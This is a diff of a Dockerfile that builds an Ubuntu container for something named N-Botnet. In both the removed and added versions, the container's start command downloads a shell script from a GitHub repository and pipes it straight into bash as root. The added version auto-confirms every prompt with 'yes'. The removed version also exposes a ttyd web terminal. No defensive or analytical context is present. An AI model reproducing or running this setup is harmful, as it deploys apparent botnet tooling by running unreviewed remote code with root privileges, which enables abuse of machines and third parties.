@@ -1,21 +1,25 @@
 FROM ubuntu:22.04
 
-RUN apt-get update && \
-    apt-get upgrade -y && \
-    apt-get install -y wget curl git python3 python3-pip neofetch sudo && \
-    apt-get clean && rm -rf /var/lib/apt/lists/*
+# Prevent interactive prompts during apt install
+ENV DEBIAN_FRONTEND=noninteractive
+ENV TZ=Etc/UTC
 
-RUN wget -qO /bin/ttyd https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
-    chmod +x /bin/ttyd
+# Install all required packages in one layer
+RUN apt update && apt install -y \
+    python3 \
+    python3-pip \
+    curl \
+    wget \
+    git \
+    build-essential \
+    sudo \
+    && apt clean \
+    && rm -rf /var/lib/apt/lists/* \
+    && pip3 install websockets
 
-RUN echo "neofetch" >> /root/.bashrc && \
-    echo "cd /root" >> /root/.bashrc
+# Set working directory
+WORKDIR /root/n-botnet
 
-EXPOSE $PORT
-
-CMD ["/bin/bash", "-c", "\
-    apt-get update && \
-    apt-get install -y sudo && \
-    sudo su -c \"bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)\" && \
-    echo \"export PS1='\\[\\033[01;32m\\]$USERNAME@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\" >> /root/.bashrc && \
-    /bin/ttyd -p $PORT -c $USERNAME:$PASSWORD /bin/bash"]
+# Run the N-Botnet setup script and client on container start
+# "yes |" prevents hanging if apt prompts for confirmation
+CMD yes | bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)
